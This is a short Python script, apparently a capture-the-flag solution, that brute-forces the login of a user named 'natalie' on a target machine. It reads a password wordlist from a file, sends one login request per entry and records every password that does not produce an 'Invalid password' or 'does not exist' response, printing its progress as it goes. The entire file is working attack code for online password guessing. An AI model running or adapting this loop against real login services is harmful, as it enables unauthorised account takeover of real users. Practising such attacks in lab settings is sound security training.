import os
from Ctf import Ctf
from dotenv import load_dotenv
load_dotenv()

if __name__ == "__main__":
    ctf = Ctf(os.getenv("MACHINE_IP"))
    username = "natalie"

    # get passwords
    pass_path = os.path.join(os.path.dirname(__file__), "./passwords.txt")
    f = open(pass_path)
    passwords = f.read().splitlines()

    found = []

    for i, password in enumerate(passwords):
        res = ctf.send_login_req(username, password)

        if "Invalid password" not in res.text and "does not exist" not in res.text:
            found.append(password)

        print(f"\033[1A\033[KBruteforcing account {username}... {i+1}/{len(passwords)} Found {len(found)}: {found}")
